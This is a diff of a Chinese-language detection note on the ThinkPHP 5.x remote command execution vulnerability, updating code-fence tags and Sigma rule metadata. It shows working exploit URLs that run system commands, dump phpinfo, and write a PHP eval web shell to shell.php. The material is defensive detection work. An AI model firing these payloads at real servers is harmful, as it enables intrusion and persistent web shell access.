@@ -15,38 +15,37 @@ ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严�
 HTTP_log，访问日志也可以
 ## 测试复现
 1.利用system函数远程命令执行
-```
-yml
+```yaml
 http://localhost:9096/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
 ```
 2.通过phpinfo函数写出phpinfo()的信息
-```
-yml
+```yaml
 http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
 ```
 3.写入shell:
-```
-yml
+```yaml
 http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php
 ```
 或者
-```
-yml
+```yaml
 http://localhost:9096/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>
 ```
 ## 测试留痕
 暂无
 ## 检测规则/思路
 ### sigma规则
-```
-yml
+```yaml
 title: Thinkphp 5.x远程命令执行漏洞
+id: 96284f32-9510-5324-aca0-9368acfebdc3
 description: 通过访问日志orHttp.log检测Thinkphp 5.x远程命令执行漏洞利用行为
-translator: 12306Bro
+translator: 0x783kb
+author: 0x783kb
 date: 2020/12/12
 status: experimental
 references:
     - https://www.cnblogs.com/backlion/p/10106676.html
+tags:
+  - attack.t1190
 logsource:
     category: webserver
 detection:
